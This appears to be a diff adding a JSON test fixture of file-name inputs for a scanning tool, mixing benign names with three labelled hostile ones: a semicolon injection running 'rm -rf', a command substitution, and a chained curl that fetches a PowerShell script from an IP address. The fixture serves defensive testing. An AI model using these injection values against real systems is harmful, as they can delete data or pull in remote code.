@@ -1,0 +1,8 @@
+[
+  { "target": "C:\\Users\\svc-backup\\report.docx", "note": "benign filename" },
+  { "target": "invoice_2026.pdf", "note": "benign filename" },
+  { "target": "evil.txt; rm -rf /tmp/pwned", "note": "HOSTILE: shell-injection filename (semicolon + command)" },
+  { "target": "$(touch /tmp/vigil-pwned)", "note": "HOSTILE: command substitution as a filename" },
+  { "target": "report.docx && curl http://185.220.101.7/a.ps1", "note": "HOSTILE: command chaining in a filename" },
+  { "target": "MATCH-me-sample.bin", "note": "benign but triggers the mock tool's exit code 1 (a finding)" }
+]
